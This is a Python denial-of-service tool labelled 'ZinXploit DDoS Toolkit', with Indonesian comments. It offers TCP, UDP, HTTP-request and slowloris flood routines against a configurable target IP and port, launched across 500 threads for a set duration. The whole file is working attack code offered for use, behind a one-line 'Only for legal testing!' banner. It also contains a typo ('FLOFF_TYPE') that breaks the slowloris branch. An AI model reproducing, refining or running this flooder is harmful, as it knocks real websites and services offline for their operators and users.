#!/usr/bin/env python3
"""
ZinXploit DDoS Toolkit - Layer 4/Layer 7 Flood
Author: ZinXploit
Mode: APEXMODEONLINE
"""

import socket
import threading
import random
import time
import sys
import os

# ---------- CONFIG ----------
TARGET_IP = "TARGET_IP_HERE"    # Ganti sama IP target
TARGET_PORT = 80                # Port target
THREAD_COUNT = 500              # Jumlah thread
ATTACK_DURATION = 60            # Durasi serangan (detik)
FLOOD_TYPE = "HTTP"             # Pilihan: "TCP", "UDP", "HTTP"

# ---------- PAYLOADS ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
]

HTTP_REQUESTS = [
    "GET /?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\n\r\n",
    "POST /login HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: 1000\r\n\r\n{}",
]

# ---------- CORE ATTACK FUNCTIONS ----------
def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.close()
        except:
            pass

def udp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            s.sendto(payload, (TARGET_IP, TARGET_PORT))
            s.close()
        except:
            pass

def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            payload = HTTP_REQUESTS[0].format(
                random.randint(1, 9999),
                TARGET_IP,
                random.choice(USER_AGENTS)
            )
            s.send(payload.encode())
            s.close()
        except:
            pass

def slowloris():
    # Slowloris attack - keep many connections open
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {TARGET_IP}\r\n".encode())
            sockets.append(s)
        except:
            pass
    
    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
            except:
                pass
        time.sleep(10)

# ---------- ATTACK CONTROLLER ----------
def attack_controller():
    print(f"\n[+] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[+] Threads: {THREAD_COUNT}")
    print(f"[+] Duration: {ATTACK_DURATION}s")
    print(f"[+] Flood Type: {FLOOD_TYPE}")
    print("[+] Starting attack...\n")
    
    threads = []
    
    # Pilih metode serangan
    if FLOOD_TYPE == "TCP":
        attack_func = tcp_flood
    elif FLOOD_TYPE == "UDP":
        attack_func = udp_flood
    elif FLOOD_TYPE == "HTTP":
        attack_func = http_flood
    elif FLOFF_TYPE == "SLOWLORIS":
        attack_func = slowloris
    else:
        print("[-] Invalid flood type")
        return
    
    # Buat thread
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_func)
        t.daemon = True
        threads.append(t)
    
    # Start semua thread
    for t in threads:
        t.start()
    
    # Timer
    time.sleep(ATTACK_DURATION)
    print("\n[+] Attack finished")
    os._exit(0)

# ---------- MAIN ----------
if __name__ == "__main__":
    # Banner
    print("""
    ╔══════════════════════════════════════════════════╗
    ║      ZINXPLOIT DDoS TOOL - APEX MODE ONLINE      ║
    ║            Layer 4/Layer 7 Flooder               ║
    ║            Only for legal testing!               ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    if TARGET_IP == "TARGET_IP_HERE":
        print("[!] Ganti TARGET_IP_HERE dengan IP target")
        sys.exit(1)
    
    attack_controller()
